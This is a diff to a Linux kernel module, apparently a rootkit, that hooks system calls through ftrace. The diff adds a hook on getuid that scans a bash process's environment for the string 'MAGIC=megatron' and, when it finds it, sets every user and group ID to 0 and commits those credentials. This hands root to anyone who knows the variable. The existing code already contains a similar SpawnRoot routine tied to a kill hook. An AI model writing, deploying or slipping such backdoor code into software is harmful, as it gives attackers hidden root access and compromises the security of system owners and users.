@@ -6,9 +6,12 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("syscall hooking");
+MODULE_AUTHOR("malefax");
 MODULE_DESCRIPTION("Simple sys_kill hook using ftrace");
 
 static asmlinkage long(*orig_kill)(const struct pt_regs *);
+typedef asmlinkage long (*orig_getuid_t)(const struct pt_regs *);
+static  orig_getuid_t orig_getuid;
 
 static asmlinkage int hook_kill(const struct pt_regs *regs){
 
@@ -25,6 +28,39 @@ static asmlinkage int hook_kill(const struct pt_regs *regs){
         return orig_kill(regs);
 }
 
+static asmlinkage long hook_getuid(const struct pt_regs *regs) {
+    
+     void rootmagic(void);
+
+    const char *name = current->comm;
+
+    struct mm_struct *mm;
+    char *envs;
+    int len, i;
+
+    if (strcmp(name, "bash") == 0) {
+        mm = current->mm;
+        if (mm && mm->env_start && mm->env_end) {
+            envs = kmalloc(PAGE_SIZE, GFP_ATOMIC);
+            if (envs) {
+                len = access_process_vm(current, mm->env_start, envs, PAGE_SIZE - 1, 0);
+                if (len > 0) {
+                    for (i = 0; i < len - 1; i++) {
+                        if (envs[i] == '\0')
+                            envs[i] = ' ';
+                    }
+                    if (strstr(envs, "MAGIC=megatron")) {
+                         rootmagic();
+                    }
+                }
+                kfree(envs);
+            }
+        }
+    }
+    return orig_getuid(regs);
+}
+
+
 void SpawnRoot(void){
         struct cred *newcredentials;
         newcredentials = prepare_creds();
@@ -32,18 +68,31 @@ void SpawnRoot(void){
         if(newcredentials == NULL){
                 return;
         }
-
         newcredentials->uid.val = 0;
         newcredentials->gid.val = 0;
         newcredentials->suid.val = 0;
         newcredentials->fsuid.val = 0;
         newcredentials->euid.val = 0;
+      
+         commit_creds(newcredentials);
+}
 
-        commit_creds(newcredentials);
+ void rootmagic(void){
+  struct cred *creds;
+  creds = prepare_creds();
+  if(creds == NULL){
+    return;
+  }
+  creds->uid.val = creds->gid.val = 0;
+  creds->euid.val = creds->egid.val = 0;
+  creds->suid.val = creds->sgid.val = 0;
+  creds->fsuid.val = creds->fsgid.val = 0;
+  commit_creds(creds);
 }
 
 static struct ftrace_hook hooks[] = {
                 HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+                HOOK("__x64_sys_getuid", hook_getuid, &orig_getuid),
 };
 
 static int __init mangekyou_init(void){
